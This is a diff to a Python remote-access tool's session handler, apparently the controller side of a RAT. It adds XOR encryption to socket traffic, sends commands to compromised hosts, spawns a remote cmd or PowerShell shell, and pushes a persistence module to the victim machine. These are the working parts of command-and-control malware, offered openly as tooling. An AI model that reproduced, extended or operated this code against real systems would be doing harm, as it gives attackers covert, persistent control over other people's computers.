@@ -9,6 +9,7 @@
 from colorama import Fore,Style
 
 from .other import printColor
+from .other import XOREncryption
 from .management import CheckConn
 from .handler import Handler
 from .sql import Sql
@@ -67,20 +68,21 @@ class Session:
                 cmd += " "
             else:
                 cmd += char
-
-        if(CheckConn().sendsafe(self.session_nb, self.socket, cmd.encode())): #send data
-            printColor("successfully",CheckConn().recvcommand(self.socket,4096).decode("utf8","replace"))
+       
+        if(CheckConn().sendsafe(self.session_nb, self.socket, cmd)): #send data
+        
+            CheckConn().recvcommand(self.socket,4096) #XOR  The decryption of xor is automatic on this method.
+            
         else:
             printColor("error","\n[-] An error occurred while sending the command.\n")
         
     def spawnShell(self,prog):
         '''--command or --powershell'''
 
-        #Ouvre un shell sur la machine distante.
-        printColor("help","\n[?] Execute -b or --back to return to sessions mode.\n") 
-        #printColor("help","\r[?] Mod shell active, You can run windows commands.\n\n")
+        #Opens a shell on the remote machine. 
+        printColor("information","\n[?] Execute -b or --back to return to sessions mode.\n\n") 
         
-        if(CheckConn().sendsafe(self.session_nb, self.socket, ("MOD_SPAWN_SHELL:"+prog).encode() ) ):
+        if(CheckConn().sendsafe(self.session_nb, self.socket, "MOD_SPAWN_SHELL:"+prog) ):
             FakeCmd(self.socket).main() #Run cmd
         
         else:
@@ -90,7 +92,7 @@ class Session:
         '''-p or --persistence'''
         #if Handler.dict_conn[self.session_nb][NB_ALIVE]:  #test is life
         mod_persi = "MOD_LONELY_PERSISTENCE:default"
-        if(CheckConn().sendsafe(self.session_nb, self.socket, mod_persi.encode())): #send mod persi
+        if(CheckConn().sendsafe(self.session_nb, self.socket, mod_persi)): #send mod persi
             #printColor("information","[+] the persistence mod was sent.\n")
             
             reponse = CheckConn().recvsafe(self.socket,4096).decode("utf-8","replace")
